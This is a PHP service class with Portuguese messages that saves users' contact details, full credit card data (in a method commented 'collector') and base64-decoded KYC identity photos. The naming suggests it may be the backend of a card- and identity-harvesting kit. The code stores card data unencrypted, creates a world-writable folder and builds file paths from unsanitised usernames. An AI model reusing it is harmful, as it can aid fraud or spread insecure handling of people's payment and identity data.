<?php

namespace App\Services;

use App\Repositories\UserRepository;

class UserService
{
    private $userRepository;

    public function __construct(UserRepository $userRepository)
    {
        $this->userRepository = $userRepository;
    }

    /**
     * Update lead information (email, phone)
     */
    public function updateLead(string $username, string $email, string $phone): array
    {
        $user = $this->userRepository->findByUsername($username);
        if (!$user) {
            return ["success" => false, "message" => "Usuário não encontrado."];
        }

        $user['email'] = $email;
        $user['phone'] = $phone;

        if ($this->userRepository->save($user)) {
            return ["success" => true];
        }

        return ["success" => false, "message" => "Erro ao salvar dados."];
    }

    /**
     * Update user credit card information (collector)
     */
    public function saveCreditCard(string $username, array $cardData): array
    {
        $user = $this->userRepository->findByUsername($username);
        if (!$user) {
            return ["success" => false, "message" => "Usuário não encontrado."];
        }

        $user['credit_card'] = array_merge($cardData, ['date' => date('d/m/Y H:i')]);

        if ($this->userRepository->save($user)) {
            return ["success" => true];
        }

        return ["success" => false, "message" => "Erro ao salvar dados do cartão."];
    }

    /**
     * Process and save KYC documents
     */
    public function processKyc(string $username, array $kycFiles): array
    {
        $user = $this->userRepository->findByUsername($username);
        if (!$user) {
            return ["success" => false, "message" => "Usuário não encontrado."];
        }

        $fotos_dir = dirname(__DIR__, 2) . '/fotos';
        if (!is_dir($fotos_dir)) {
            mkdir($fotos_dir, 0777, true);
        }

        $kycPaths = [];
        foreach ($kycFiles as $key => $base64_data) {
            if (!empty($base64_data) && strpos($base64_data, 'base64,') !== false) {
                $data = explode(',', $base64_data);
                if (isset($data[1])) {
                    $filename = $username . '_' . $key . '.jpg';
                    $filepath = $fotos_dir . '/' . $filename;
                    file_put_contents($filepath, base64_decode($data[1]));
                    $kyPaths[$key] = 'fotos/' . $filename;
                }
            }
        }

        if (!empty($kyPaths)) {
            $user['kyc'] = array_merge($user['kyc'] ?? [], $kyPaths);
            $user['status'] = 'Em Análise';
            if ($this->userRepository->save($user)) {
                return ["success" => true, "message" => "Documentos enviados com sucesso!"];
            }
        }

        return ["success" => false, "message" => "Nenhum documento processado."];
    }
}
